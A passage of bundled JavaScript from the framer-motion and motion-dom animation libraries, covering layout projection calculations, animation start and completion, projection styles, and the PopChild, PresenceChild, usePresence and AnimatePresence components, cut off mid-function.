			let canSkip = true;
			/**
			* If this is a normal layout animation and neither this node nor its nearest projecting
			* is dirty then we can't skip.
			*/
			if (this.isProjectionDirty || this.parent?.isProjectionDirty) canSkip = false;
			/**
			* If this is a shared layout animation and this node's shared projection is dirty then
			* we can't skip.
			*/
			if (isShared && (this.isSharedProjectionDirty || this.isTransformDirty)) canSkip = false;
			/**
			* If we have resolved the target this frame we must recalculate the
			* projection to ensure it visually represents the internal calculations.
			*/
			if (this.resolvedRelativeTargetAt === frameData.timestamp) canSkip = false;
			if (canSkip) return;
			const { layout, layoutId } = this.options;
			/**
			* If this section of the tree isn't animating we can
			* delete our target sources for the following frame.
			*/
			this.isTreeAnimating = Boolean(this.parent && this.parent.isTreeAnimating || this.currentAnimation || this.pendingAnimation);
			if (!this.isTreeAnimating) this.targetDelta = this.relativeTarget = void 0;
			if (!this.layout || !(layout || layoutId)) return;
			/**
			* Reset the corrected box with the latest values from box, as we're then going
			* to perform mutative operations on it.
			*/
			copyBoxInto(this.layoutCorrected, this.layout.layoutBox);
			/**
			* Record previous tree scales before updating.
			*/
			const prevTreeScaleX = this.treeScale.x;
			const prevTreeScaleY = this.treeScale.y;
			/**
			* Apply all the parent deltas to this box to produce the corrected box. This
			* is the layout box, as it will appear on screen as a result of the transforms of its parents.
			*/
			applyTreeDeltas(this.layoutCorrected, this.treeScale, this.path, isShared);
			/**
			* If this layer needs to perform scale correction but doesn't have a target,
			* use the layout as the target.
			*/
			if (lead.layout && !lead.target && (this.treeScale.x !== 1 || this.treeScale.y !== 1)) {
				lead.target = lead.layout.layoutBox;
				lead.targetWithTransforms = createBox();
			}
			const { target } = lead;
			if (!target) {
				/**
				* If we don't have a target to project into, but we were previously
				* projecting, we want to remove the stored transform and schedule
				* a render to ensure the elements reflect the removed transform.
				*/
				if (this.prevProjectionDelta) {
					this.createProjectionDeltas();
					this.scheduleRender();
				}
				return;
			}
			if (!this.projectionDelta || !this.prevProjectionDelta) this.createProjectionDeltas();
			else {
				copyAxisDeltaInto(this.prevProjectionDelta.x, this.projectionDelta.x);
				copyAxisDeltaInto(this.prevProjectionDelta.y, this.projectionDelta.y);
			}
			/**
			* Update the delta between the corrected box and the target box before user-set transforms were applied.
			* This will allow us to calculate the corrected borderRadius and boxShadow to compensate
			* for our layout reprojection, but still allow them to be scaled correctly by the user.
			* It might be that to simplify this we may want to accept that user-set scale is also corrected
			* and we wouldn't have to keep and calc both deltas, OR we could support a user setting
			* to allow people to choose whether these styles are corrected based on just the
			* layout reprojection or the final bounding box.
			*/
			calcBoxDelta(this.projectionDelta, this.layoutCorrected, target, this.latestValues);
			if (this.treeScale.x !== prevTreeScaleX || this.treeScale.y !== prevTreeScaleY || !axisDeltaEquals(this.projectionDelta.x, this.prevProjectionDelta.x) || !axisDeltaEquals(this.projectionDelta.y, this.prevProjectionDelta.y)) {
				this.hasProjected = true;
				this.scheduleRender();
				this.notifyListeners("projectionUpdate", target);
			}
			/**
			* Increase debug counter for recalculated projections
			*/
			if (statsBuffer.value) metrics.calculatedProjections++;
		}
		hide() {
			this.isVisible = false;
		}
		show() {
			this.isVisible = true;
		}
		scheduleRender(notifyAll = true) {
			this.options.visualElement?.scheduleRender();
			if (notifyAll) {
				const stack = this.getStack();
				stack && stack.scheduleRender();
			}
			if (this.resumingFrom && !this.resumingFrom.instance) this.resumingFrom = void 0;
		}
		createProjectionDeltas() {
			this.prevProjectionDelta = createDelta();
			this.projectionDelta = createDelta();
			this.projectionDeltaWithTransform = createDelta();
		}
		setAnimationOrigin(delta, hasOnlyRelativeTargetChanged = false, pathFn) {
			const snapshot = this.snapshot;
			const snapshotLatestValues = snapshot ? snapshot.latestValues : {};
			const mixedValues = { ...this.latestValues };
			const targetDelta = createDelta();
			if (!this.relativeParent || !this.relativeParent.options.layoutRoot) this.relativeTarget = this.relativeTargetOrigin = void 0;
			this.attemptToResolveRelativeTarget = !hasOnlyRelativeTargetChanged;
			const relativeLayout = createBox();
			const isSharedLayoutAnimation = (snapshot ? snapshot.source : void 0) !== (this.layout ? this.layout.source : void 0);
			const stack = this.getStack();
			const isOnlyMember = !stack || stack.members.length <= 1;
			const shouldCrossfadeOpacity = Boolean(isSharedLayoutAnimation && !isOnlyMember && this.options.crossfade === true && !this.path.some(hasOpacityCrossfade));
			this.animationProgress = 0;
			let prevRelativeTarget;
			const interpolate = pathFn?.interpolateProjection(delta);
			this.mixTargetDelta = (latest) => {
				const progress = latest / 1e3;
				const point = interpolate?.(progress);
				if (point) {
					targetDelta.x.translate = point.x;
					targetDelta.x.scale = mixNumber$1(delta.x.scale, 1, progress);
					targetDelta.x.origin = delta.x.origin;
					targetDelta.x.originPoint = delta.x.originPoint;
					targetDelta.y.translate = point.y;
					targetDelta.y.scale = mixNumber$1(delta.y.scale, 1, progress);
					targetDelta.y.origin = delta.y.origin;
					targetDelta.y.originPoint = delta.y.originPoint;
				} else {
					mixAxisDeltaLinear(targetDelta.x, delta.x, progress);
					mixAxisDeltaLinear(targetDelta.y, delta.y, progress);
				}
				this.setTargetDelta(targetDelta);
				if (this.relativeTarget && this.relativeTargetOrigin && this.layout && this.relativeParent && this.relativeParent.layout) {
					calcRelativePosition(relativeLayout, this.layout.layoutBox, this.relativeParent.layout.layoutBox, this.options.layoutAnchor || void 0);
					mixBox(this.relativeTarget, this.relativeTargetOrigin, relativeLayout, progress);
					/**
					* If this is an unchanged relative target we can consider the
					* projection not dirty.
					*/
					if (prevRelativeTarget && boxEquals(this.relativeTarget, prevRelativeTarget)) this.isProjectionDirty = false;
					if (!prevRelativeTarget) prevRelativeTarget = createBox();
					copyBoxInto(prevRelativeTarget, this.relativeTarget);
				}
				if (isSharedLayoutAnimation) {
					this.animationValues = mixedValues;
					mixValues(mixedValues, snapshotLatestValues, this.latestValues, progress, shouldCrossfadeOpacity, isOnlyMember);
				}
				if (point && point.rotate !== void 0) {
					if (!this.animationValues) this.animationValues = mixedValues;
					this.animationValues.pathRotation = point.rotate;
				}
				this.root.scheduleUpdateProjection();
				this.scheduleRender();
				this.animationProgress = progress;
			};
			this.mixTargetDelta(this.options.layoutRoot ? 1e3 : 0);
		}
		startAnimation(options) {
			this.notifyListeners("animationStart");
			this.currentAnimation?.stop();
			this.resumingFrom?.currentAnimation?.stop();
			if (this.pendingAnimation) {
				cancelFrame(this.pendingAnimation);
				this.pendingAnimation = void 0;
			}
			/**
			* Start the animation in the next frame to have a frame with progress 0,
			* where the target is the same as when the animation started, so we can
			* calculate the relative positions correctly for instant transitions.
			*/
			this.pendingAnimation = frame.update(() => {
				globalProjectionState.hasAnimatedSinceResize = true;
				this.motionValue || (this.motionValue = motionValue(0));
				this.motionValue.jump(0, false);
				this.currentAnimation = animateSingleValue(this.motionValue, [0, 1e3], {
					...options,
					velocity: 0,
					isSync: true,
					onUpdate: (latest) => {
						this.mixTargetDelta(latest);
						options.onUpdate && options.onUpdate(latest);
					},
					onComplete: () => {
						options.onComplete && options.onComplete();
						this.completeAnimation();
					}
				});
				if (this.resumingFrom) this.resumingFrom.currentAnimation = this.currentAnimation;
				this.pendingAnimation = void 0;
			});
		}
		completeAnimation() {
			if (this.resumingFrom) {
				this.resumingFrom.currentAnimation = void 0;
				this.resumingFrom.preserveOpacity = void 0;
			}
			const stack = this.getStack();
			stack && stack.exitAnimationComplete();
			this.resumingFrom = this.currentAnimation = this.animationValues = void 0;
			this.notifyListeners("animationComplete");
		}
		finishAnimation() {
			if (this.currentAnimation) {
				this.mixTargetDelta && this.mixTargetDelta(animationTarget);
				this.currentAnimation.stop();
			}
			this.completeAnimation();
		}
		applyTransformsToTarget() {
			const lead = this.getLead();
			let { targetWithTransforms, target, layout, latestValues } = lead;
			if (!targetWithTransforms || !target || !layout) return;
			/**
			* If we're only animating position, and this element isn't the lead element,
			* then instead of projecting into the lead box we instead want to calculate
			* a new target that aligns the two boxes but maintains the layout shape.
			*/
			if (this !== lead && this.layout && layout && shouldAnimatePositionOnly(this.options.animationType, this.layout.layoutBox, layout.layoutBox)) {
				target = this.target || createBox();
				const xLength = calcLength(this.layout.layoutBox.x);
				target.x.min = lead.target.x.min;
				target.x.max = target.x.min + xLength;
				const yLength = calcLength(this.layout.layoutBox.y);
				target.y.min = lead.target.y.min;
				target.y.max = target.y.min + yLength;
			}
			copyBoxInto(targetWithTransforms, target);
			/**
			* Apply the latest user-set transforms to the targetBox to produce the targetBoxFinal.
			* This is the final box that we will then project into by calculating a transform delta and
			* applying it to the corrected box.
			*/
			transformBox(targetWithTransforms, latestValues);
			/**
			* Update the delta between the corrected box and the final target box, after
			* user-set transforms are applied to it. This will be used by the renderer to
			* create a transform style that will reproject the element from its layout layout
			* into the desired bounding box.
			*/
			calcBoxDelta(this.projectionDeltaWithTransform, this.layoutCorrected, targetWithTransforms, latestValues);
		}
		registerSharedNode(layoutId, node) {
			if (!this.sharedNodes.has(layoutId)) this.sharedNodes.set(layoutId, new NodeStack());
			this.sharedNodes.get(layoutId).add(node);
			const config = node.options.initialPromotionConfig;
			node.promote({
				transition: config ? config.transition : void 0,
				preserveFollowOpacity: config && config.shouldPreserveFollowOpacity ? config.shouldPreserveFollowOpacity(node) : void 0
			});
		}
		isLead() {
			const stack = this.getStack();
			return stack ? stack.lead === this : true;
		}
		getLead() {
			const { layoutId } = this.options;
			return layoutId ? this.getStack()?.lead || this : this;
		}
		getPrevLead() {
			const { layoutId } = this.options;
			return layoutId ? this.getStack()?.prevLead : void 0;
		}
		getStack() {
			const { layoutId } = this.options;
			if (layoutId) return this.root.sharedNodes.get(layoutId);
		}
		promote({ needsReset, transition, preserveFollowOpacity } = {}) {
			const stack = this.getStack();
			if (stack) stack.promote(this, preserveFollowOpacity);
			if (needsReset) {
				this.projectionDelta = void 0;
				this.needsReset = true;
			}
			if (transition) this.setOptions({ transition });
		}
		relegate() {
			const stack = this.getStack();
			if (stack) return stack.relegate(this);
			else return false;
		}
		resetSkewAndRotation() {
			const { visualElement } = this.options;
			if (!visualElement) return;
			let hasDistortingTransform = false;
			/**
			* An unrolled check for rotation values. Most elements don't have any rotation and
			* skipping the nested loop and new object creation is 50% faster.
			*/
			const { latestValues } = visualElement;
			if (latestValues.z || latestValues.rotate || latestValues.rotateX || latestValues.rotateY || latestValues.rotateZ || latestValues.skewX || latestValues.skewY) hasDistortingTransform = true;
			if (!hasDistortingTransform) return;
			const resetValues = {};
			if (latestValues.z) resetDistortingTransform("z", visualElement, resetValues, this.animationValues);
			for (let i = 0; i < transformAxes.length; i++) {
				resetDistortingTransform(`rotate${transformAxes[i]}`, visualElement, resetValues, this.animationValues);
				resetDistortingTransform(`skew${transformAxes[i]}`, visualElement, resetValues, this.animationValues);
			}
			visualElement.render();
			for (const key in resetValues) {
				visualElement.setStaticValue(key, resetValues[key]);
				if (this.animationValues) this.animationValues[key] = resetValues[key];
			}
			visualElement.scheduleRender();
		}
		applyProjectionStyles(targetStyle, styleProp) {
			if (!this.instance || this.isSVG) return;
			if (!this.isVisible) {
				targetStyle.visibility = "hidden";
				return;
			}
			const transformTemplate = this.getTransformTemplate();
			if (this.needsReset) {
				this.needsReset = false;
				targetStyle.visibility = "";
				targetStyle.opacity = "";
				targetStyle.pointerEvents = resolveMotionValue(styleProp?.pointerEvents) || "";
				targetStyle.transform = transformTemplate ? transformTemplate(this.latestValues, "") : "none";
				return;
			}
			const lead = this.getLead();
			if (!this.projectionDelta || !this.layout || !lead.target) {
				if (this.options.layoutId) {
					targetStyle.opacity = this.latestValues.opacity !== void 0 ? this.latestValues.opacity : 1;
					targetStyle.pointerEvents = resolveMotionValue(styleProp?.pointerEvents) || "";
				}
				if (this.hasProjected && !hasTransform(this.latestValues)) {
					targetStyle.transform = transformTemplate ? transformTemplate({}, "") : "none";
					this.hasProjected = false;
				}
				return;
			}
			targetStyle.visibility = "";
			const valuesToRender = lead.animationValues || lead.latestValues;
			this.applyTransformsToTarget();
			let transform = buildProjectionTransform(this.projectionDeltaWithTransform, this.treeScale, valuesToRender);
			if (transformTemplate) transform = transformTemplate(valuesToRender, transform);
			targetStyle.transform = transform;
			const { x, y } = this.projectionDelta;
			targetStyle.transformOrigin = `${x.origin * 100}% ${y.origin * 100}% 0`;
			if (lead.animationValues)
 /**
			* If the lead component is animating, assign this either the entering/leaving
			* opacity
			*/
			targetStyle.opacity = lead === this ? valuesToRender.opacity ?? this.latestValues.opacity ?? 1 : this.preserveOpacity ? this.latestValues.opacity : valuesToRender.opacityExit;
			else
 /**
			* Or we're not animating at all, set the lead component to its layout
			* opacity and other components to hidden.
			*/
			targetStyle.opacity = lead === this ? valuesToRender.opacity !== void 0 ? valuesToRender.opacity : "" : valuesToRender.opacityExit !== void 0 ? valuesToRender.opacityExit : 0;
			/**
			* Apply scale correction
			*/
			for (const key in scaleCorrectors) {
				if (valuesToRender[key] === void 0) continue;
				const { correct, applyTo, isCSSVariable } = scaleCorrectors[key];
				/**
				* Only apply scale correction to the value if we have an
				* active projection transform. Otherwise these values become
				* vulnerable to distortion if the element changes size without
				* a corresponding layout animation.
				*/
				const corrected = transform === "none" ? valuesToRender[key] : correct(valuesToRender[key], lead);
				if (applyTo) {
					const num = applyTo.length;
					for (let i = 0; i < num; i++) targetStyle[applyTo[i]] = corrected;
				} else if (isCSSVariable) this.options.visualElement.renderState.vars[key] = corrected;
				else targetStyle[key] = corrected;
			}
			/**
			* Disable pointer events on follow components. This is to ensure
			* that if a follow component covers a lead component it doesn't block
			* pointer events on the lead.
			*/
			if (this.options.layoutId) targetStyle.pointerEvents = lead === this ? resolveMotionValue(styleProp?.pointerEvents) || "" : "none";
		}
		clearSnapshot() {
			this.resumeFrom = this.snapshot = void 0;
		}
		resetTree() {
			this.root.nodes.forEach((node) => node.currentAnimation?.stop());
			this.root.nodes.forEach(clearMeasurements);
			this.root.sharedNodes.clear();
		}
	};
}
function updateLayout(node) {
	node.updateLayout();
}
function notifyLayoutUpdate(node) {
	const snapshot = node.resumeFrom?.snapshot || node.snapshot;
	if (node.isLead() && node.layout && snapshot && node.hasListeners("didUpdate")) {
		const { layoutBox: layout, measuredBox: measuredLayout } = node.layout;
		const { animationType } = node.options;
		const isShared = snapshot.source !== node.layout.source;
		if (animationType === "size") eachAxis((axis) => {
			const axisSnapshot = isShared ? snapshot.measuredBox[axis] : snapshot.layoutBox[axis];
			const length = calcLength(axisSnapshot);
			axisSnapshot.min = layout[axis].min;
			axisSnapshot.max = axisSnapshot.min + length;
		});
		else if (animationType === "x" || animationType === "y") {
			const snapAxis = animationType === "x" ? "y" : "x";
			copyAxisInto(isShared ? snapshot.measuredBox[snapAxis] : snapshot.layoutBox[snapAxis], layout[snapAxis]);
		} else if (shouldAnimatePositionOnly(animationType, snapshot.layoutBox, layout)) eachAxis((axis) => {
			const axisSnapshot = isShared ? snapshot.measuredBox[axis] : snapshot.layoutBox[axis];
			const length = calcLength(layout[axis]);
			axisSnapshot.max = axisSnapshot.min + length;
			/**
			* Ensure relative target gets resized and rerendererd
			*/
			if (node.relativeTarget && !node.currentAnimation) {
				node.isProjectionDirty = true;
				node.relativeTarget[axis].max = node.relativeTarget[axis].min + length;
			}
		});
		const layoutDelta = createDelta();
		calcBoxDelta(layoutDelta, layout, snapshot.layoutBox);
		const visualDelta = createDelta();
		if (isShared) calcBoxDelta(visualDelta, node.applyTransform(measuredLayout, true), snapshot.measuredBox);
		else calcBoxDelta(visualDelta, layout, snapshot.layoutBox);
		const hasLayoutChanged = !isDeltaZero(layoutDelta);
		let hasRelativeLayoutChanged = false;
		if (!node.resumeFrom) {
			const relativeParent = node.getClosestProjectingParent();
			/**
			* If the relativeParent is itself resuming from a different element then
			* the relative snapshot is not relavent
			*/
			if (relativeParent && !relativeParent.resumeFrom) {
				const { snapshot: parentSnapshot, layout: parentLayout } = relativeParent;
				if (parentSnapshot && parentLayout) {
					const anchor = node.options.layoutAnchor || void 0;
					const relativeSnapshot = createBox();
					calcRelativePosition(relativeSnapshot, snapshot.layoutBox, parentSnapshot.layoutBox, anchor);
					const relativeLayout = createBox();
					calcRelativePosition(relativeLayout, layout, parentLayout.layoutBox, anchor);
					if (!boxEqualsRounded(relativeSnapshot, relativeLayout)) hasRelativeLayoutChanged = true;
					if (relativeParent.options.layoutRoot) {
						node.relativeTarget = relativeLayout;
						node.relativeTargetOrigin = relativeSnapshot;
						node.relativeParent = relativeParent;
					}
				}
			}
		}
		node.notifyListeners("didUpdate", {
			layout,
			snapshot,
			delta: visualDelta,
			layoutDelta,
			hasLayoutChanged,
			hasRelativeLayoutChanged
		});
	} else if (node.isLead()) {
		const { onExitComplete } = node.options;
		onExitComplete && onExitComplete();
	}
	/**
	* Clearing transition
	* TODO: Investigate why this transition is being passed in as {type: false } from Framer
	* and why we need it at all
	*/
	node.options.transition = void 0;
}
function propagateDirtyNodes(node) {
	/**
	* Increase debug counter for nodes encountered this frame
	*/
	if (statsBuffer.value) metrics.nodes++;
	if (!node.parent) return;
	/**
	* If this node isn't projecting, propagate isProjectionDirty. It will have
	* no performance impact but it will allow the next child that *is* projecting
	* but *isn't* dirty to just check its parent to see if *any* ancestor needs
	* correcting.
	*/
	if (!node.isProjecting()) node.isProjectionDirty = node.parent.isProjectionDirty;
	/**
	* Propagate isSharedProjectionDirty and isTransformDirty
	* throughout the whole tree. A future revision can take another look at
	* this but for safety we still recalcualte shared nodes.
	*/
	node.isSharedProjectionDirty || (node.isSharedProjectionDirty = Boolean(node.isProjectionDirty || node.parent.isProjectionDirty || node.parent.isSharedProjectionDirty));
	node.isTransformDirty || (node.isTransformDirty = node.parent.isTransformDirty);
}
function cleanDirtyNodes(node) {
	node.isProjectionDirty = node.isSharedProjectionDirty = node.isTransformDirty = false;
}
function clearSnapshot(node) {
	node.clearSnapshot();
}
function clearMeasurements(node) {
	node.clearMeasurements();
}
function forceLayoutMeasure(node) {
	node.isLayoutDirty = true;
	node.updateLayout();
}
function clearIsLayoutDirty(node) {
	node.isLayoutDirty = false;
}
/**
* When a node is animation-blocked (e.g. during drag) and its component
* didn't re-render (memoized), willUpdate() is never called so there's
* no snapshot. Use the previous layout as a snapshot and mark dirty so
* resetTransform/updateLayout/notifyLayoutUpdate process it normally.
*/
function ensureDraggedNodesSnapshotted(node) {
	if (node.isAnimationBlocked && node.layout && !node.isLayoutDirty) {
		node.snapshot = node.layout;
		node.isLayoutDirty = true;
	}
}
function resetTransformStyle(node) {
	const { visualElement } = node.options;
	if (visualElement && visualElement.getProps().onBeforeLayoutMeasure) visualElement.notify("BeforeLayoutMeasure");
	node.resetTransform();
}
function finishAnimation(node) {
	node.finishAnimation();
	node.targetDelta = node.relativeTarget = node.target = void 0;
	node.isProjectionDirty = true;
}
function resolveTargetDelta(node) {
	node.resolveTargetDelta();
}
function calcProjection(node) {
	node.calcProjection();
}
function resetSkewAndRotation(node) {
	node.resetSkewAndRotation();
}
function removeLeadSnapshots(stack) {
	stack.removeLeadSnapshot();
}
function mixAxisDeltaLinear(output, delta, p) {
	output.translate = mixNumber$1(delta.translate, 0, p);
	output.scale = mixNumber$1(delta.scale, 1, p);
	output.origin = delta.origin;
	output.originPoint = delta.originPoint;
}
function mixAxis(output, from, to, p) {
	output.min = mixNumber$1(from.min, to.min, p);
	output.max = mixNumber$1(from.max, to.max, p);
}
function mixBox(output, from, to, p) {
	mixAxis(output.x, from.x, to.x, p);
	mixAxis(output.y, from.y, to.y, p);
}
function hasOpacityCrossfade(node) {
	return node.animationValues && node.animationValues.opacityExit !== void 0;
}
var defaultLayoutTransition = {
	duration: .45,
	ease: [
		.4,
		0,
		.1,
		1
	]
};
var userAgentContains = (string) => typeof navigator !== "undefined" && navigator.userAgent && navigator.userAgent.toLowerCase().includes(string);
/**
* Measured bounding boxes must be rounded in Safari and
* left untouched in Chrome, otherwise non-integer layouts within scaled-up elements
* can appear to jump.
*/
var roundPoint = userAgentContains("applewebkit/") && !userAgentContains("chrome/") ? Math.round : noop;
function roundAxis(axis) {
	axis.min = roundPoint(axis.min);
	axis.max = roundPoint(axis.max);
}
function roundBox(box) {
	roundAxis(box.x);
	roundAxis(box.y);
}
function shouldAnimatePositionOnly(animationType, snapshot, layout) {
	return animationType === "position" || animationType === "preserve-aspect" && !isNear(aspectRatio(snapshot), aspectRatio(layout), .2);
}
function checkNodeWasScrollRoot(node) {
	return node !== node.root && node.scroll?.wasRoot;
}
// node_modules/motion-dom/dist/es/projection/node/DocumentProjectionNode.mjs
var DocumentProjectionNode = createProjectionNode$1({
	attachResizeListener: (ref, notify) => addDomEvent(ref, "resize", notify),
	measureScroll: () => ({
		x: document.documentElement.scrollLeft || document.body?.scrollLeft || 0,
		y: document.documentElement.scrollTop || document.body?.scrollTop || 0
	}),
	checkIsScrollRoot: () => true
});
// node_modules/motion-dom/dist/es/projection/node/HTMLProjectionNode.mjs
var rootProjectionNode = { current: void 0 };
var HTMLProjectionNode = createProjectionNode$1({
	measureScroll: (instance) => ({
		x: instance.scrollLeft,
		y: instance.scrollTop
	}),
	defaultParent: () => {
		if (!rootProjectionNode.current) {
			const documentNode = new DocumentProjectionNode({});
			documentNode.mount(window);
			documentNode.setOptions({ layoutScroll: true });
			rootProjectionNode.current = documentNode;
		}
		return rootProjectionNode.current;
	},
	resetTransform: (instance, value) => {
		instance.style.transform = value !== void 0 ? value : "none";
	},
	checkIsScrollRoot: (instance) => Boolean(window.getComputedStyle(instance).position === "fixed")
});
// node_modules/framer-motion/dist/es/context/MotionConfigContext.mjs
/**
* @public
*/
var MotionConfigContext = createContext({
	transformPagePoint: (p) => p,
	isStatic: false,
	reducedMotion: "never"
});
// node_modules/framer-motion/dist/es/utils/use-composed-ref.mjs
/**
* Taken from https://github.com/radix-ui/primitives/blob/main/packages/react/compose-refs/src/compose-refs.tsx
*/
/**
* Set a given ref to a given value
* This utility takes care of different types of refs: callback refs and RefObject(s)
*/
function setRef(ref, value) {
	if (typeof ref === "function") return ref(value);
	else if (ref !== null && ref !== void 0) ref.current = value;
}
/**
* A utility to compose multiple refs together
* Accepts callback refs and RefObject(s)
*/
function composeRefs(...refs) {
	return (node) => {
		let hasCleanup = false;
		const cleanups = refs.map((ref) => {
			const cleanup = setRef(ref, node);
			if (!hasCleanup && typeof cleanup === "function") hasCleanup = true;
			return cleanup;
		});
		if (hasCleanup) return () => {
			for (let i = 0; i < cleanups.length; i++) {
				const cleanup = cleanups[i];
				if (typeof cleanup === "function") cleanup();
				else setRef(refs[i], null);
			}
		};
	};
}
/**
* A custom hook that composes multiple refs
* Accepts callback refs and RefObject(s)
*/
function useComposedRefs(...refs) {
	return React.useCallback(composeRefs(...refs), refs);
}
// node_modules/framer-motion/dist/es/components/AnimatePresence/PopChild.mjs
/**
* Measurement functionality has to be within a separate component
* to leverage snapshot lifecycle.
*/
var PopChildMeasure = class extends React.Component {
	getSnapshotBeforeUpdate(prevProps) {
		const element = this.props.childRef.current;
		if (isHTMLElement(element) && prevProps.isPresent && !this.props.isPresent && this.props.pop !== false) {
			const parent = element.offsetParent;
			const parentWidth = isHTMLElement(parent) ? parent.offsetWidth || 0 : 0;
			const parentHeight = isHTMLElement(parent) ? parent.offsetHeight || 0 : 0;
			const computedStyle = getComputedStyle(element);
			const size = this.props.sizeRef.current;
			size.height = parseFloat(computedStyle.height);
			size.width = parseFloat(computedStyle.width);
			size.top = element.offsetTop;
			size.left = element.offsetLeft;
			size.right = parentWidth - size.width - size.left;
			size.bottom = parentHeight - size.height - size.top;
			size.direction = computedStyle.direction;
		}
		return null;
	}
	/**
	* Required with getSnapshotBeforeUpdate to stop React complaining.
	*/
	componentDidUpdate() {}
	render() {
		return this.props.children;
	}
};
function PopChild({ children, isPresent, anchorX, anchorY, root, pop }) {
	const id = useId();
	const ref = useRef(null);
	const size = useRef({
		width: 0,
		height: 0,
		top: 0,
		left: 0,
		right: 0,
		bottom: 0,
		direction: "ltr"
	});
	const { nonce } = useContext(MotionConfigContext);
	const composedRef = useComposedRefs(ref, children.props?.ref ?? children?.ref);
	/**
	* We create and inject a style block so we can apply this explicit
	* sizing in a non-destructive manner by just deleting the style block.
	*
	* We can't apply size via render as the measurement happens
	* in getSnapshotBeforeUpdate (post-render), likewise if we apply the
	* styles directly on the DOM node, we might be overwriting
	* styles set via the style prop.
	*/
	useInsertionEffect(() => {
		const { width, height, top, left, right, bottom, direction } = size.current;
		if (isPresent || pop === false || !ref.current || !width || !height) return;
		const isRTL = direction === "rtl";
		const x = anchorX === "left" ? isRTL ? `right: ${right}` : `left: ${left}` : isRTL ? `left: ${left}` : `right: ${right}`;
		const y = anchorY === "bottom" ? `bottom: ${bottom}` : `top: ${top}`;
		ref.current.dataset.motionPopId = id;
		const style = document.createElement("style");
		if (nonce) style.nonce = nonce;
		const parent = root ?? document.head;
		parent.appendChild(style);
		if (style.sheet) style.sheet.insertRule(`
          [data-motion-pop-id="${id}"] {
            position: absolute !important;
            width: ${width}px !important;
            height: ${height}px !important;
            ${x}px !important;
            ${y}px !important;
          }
        `);
		return () => {
			ref.current?.removeAttribute("data-motion-pop-id");
			if (parent.contains(style)) parent.removeChild(style);
		};
	}, [isPresent]);
	return jsx(PopChildMeasure, {
		isPresent,
		childRef: ref,
		sizeRef: size,
		pop,
		children: pop === false ? children : React.cloneElement(children, { ref: composedRef })
	});
}
// node_modules/framer-motion/dist/es/components/AnimatePresence/PresenceChild.mjs
var PresenceChild = ({ children, initial, isPresent, onExitComplete, custom, presenceAffectsLayout, mode, anchorX, anchorY, root }) => {
	const presenceChildren = useConstant(newChildrenMap);
	const id = useId();
	let isReusedContext = true;
	let context = useMemo(() => {
		isReusedContext = false;
		return {
			id,
			initial,
			isPresent,
			custom,
			onExitComplete: (childId) => {
				presenceChildren.set(childId, true);
				for (const isComplete of presenceChildren.values()) if (!isComplete) return;
				onExitComplete && onExitComplete();
			},
			register: (childId) => {
				presenceChildren.set(childId, false);
				return () => presenceChildren.delete(childId);
			}
		};
	}, [
		isPresent,
		presenceChildren,
		onExitComplete
	]);
	/**
	* If the presence of a child affects the layout of the components around it,
	* we want to make a new context value to ensure they get re-rendered
	* so they can detect that layout change.
	*/
	if (presenceAffectsLayout && isReusedContext) context = { ...context };
	useMemo(() => {
		presenceChildren.forEach((_, key) => presenceChildren.set(key, false));
	}, [isPresent]);
	/**
	* If there's no `motion` components to fire exit animations, we want to remove this
	* component immediately.
	*/
	React.useEffect(() => {
		!isPresent && !presenceChildren.size && onExitComplete && onExitComplete();
	}, [isPresent]);
	children = jsx(PopChild, {
		pop: mode === "popLayout",
		isPresent,
		anchorX,
		anchorY,
		root,
		children
	});
	return jsx(PresenceContext.Provider, {
		value: context,
		children
	});
};
function newChildrenMap() {
	return /* @__PURE__ */ new Map();
}
// node_modules/framer-motion/dist/es/components/AnimatePresence/use-presence.mjs
/**
* When a component is the child of `AnimatePresence`, it can use `usePresence`
* to access information about whether it's still present in the React tree.
*
* ```jsx
* import { usePresence } from "framer-motion"
*
* export const Component = () => {
*   const [isPresent, safeToRemove] = usePresence()
*
*   useEffect(() => {
*     !isPresent && setTimeout(safeToRemove, 1000)
*   }, [isPresent])
*
*   return <div />
* }
* ```
*
* If `isPresent` is `false`, it means that a component has been removed from the tree,
* but `AnimatePresence` won't really remove it until `safeToRemove` has been called.
*
* @public
*/
function usePresence(subscribe = true) {
	const context = useContext(PresenceContext);
	if (context === null) return [true, null];
	const { isPresent, onExitComplete, register } = context;
	const id = useId();
	useEffect(() => {
		if (subscribe) return register(id);
	}, [subscribe]);
	const safeToRemove = useCallback(() => subscribe && onExitComplete && onExitComplete(id), [
		id,
		onExitComplete,
		subscribe
	]);
	return !isPresent && onExitComplete ? [false, safeToRemove] : [true];
}
// node_modules/framer-motion/dist/es/components/AnimatePresence/utils.mjs
var getChildKey = (child) => child.key || "";
function onlyElements(children) {
	const filtered = [];
	Children.forEach(children, (child) => {
		if (isValidElement(child)) filtered.push(child);
	});
	return filtered;
}
// node_modules/framer-motion/dist/es/components/AnimatePresence/index.mjs
/**
* `AnimatePresence` enables the animation of components that have been removed from the tree.
*
* When adding/removing more than a single child, every child **must** be given a unique `key` prop.
*
* Any `motion` components that have an `exit` property defined will animate out when removed from
* the tree.
*
* ```jsx
* import { motion, AnimatePresence } from 'framer-motion'
*
* export const Items = ({ items }) => (
*   <AnimatePresence>
*     {items.map(item => (
*       <motion.div
*         key={item.id}
*         initial={{ opacity: 0 }}
*         animate={{ opacity: 1 }}
*         exit={{ opacity: 0 }}
*       />
*     ))}
*   </AnimatePresence>
* )
* ```
*
* You can sequence exit animations throughout a tree using variants.
*
* If a child contains multiple `motion` components with `exit` props, it will only unmount the child
* once all `motion` components have finished animating out. Likewise, any components using
* `usePresence` all need to call `safeToRemove`.
*
* @public
*/
var AnimatePresence = ({ children, custom, initial = true, onExitComplete, presenceAffectsLayout = true, mode = "sync", propagate = false, anchorX = "left", anchorY = "top", root }) => {
	const [isParentPresent, safeToRemove] = usePresence(propagate);
	/**
	* Filter any children that aren't ReactElements. We can only track components
	* between renders with a props.key.
	*/
	const presentChildren = useMemo(() => onlyElements(children), [children]);
	/**
	* Track the keys of the currently rendered children. This is used to
	* determine which children are exiting.
	*/
	const presentKeys = propagate && !isParentPresent ? [] : presentChildren.map(getChildKey);
	/**
	* If `initial={false}` we only want to pass this to components in the first render.
	*/
	const isInitialRender = useRef(true);
	/**
	* A ref containing the currently present children. When all exit animations
	* are complete, we use this to re-render the component with the latest children
	* *committed* rather than the latest children *rendered*.
	*/
	const pendingPresentChildren = useRef(presentChildren);
	/**
	* Track which exiting children have finished animating out.
	*/
	const exitComplete = useConstant(() => /* @__PURE__ */ new Map());
	/**
	* Track which components are currently processing exit to prevent duplicate processing.
	*/
	const exitingComponents = useRef(/* @__PURE__ */ new Set());
	/**
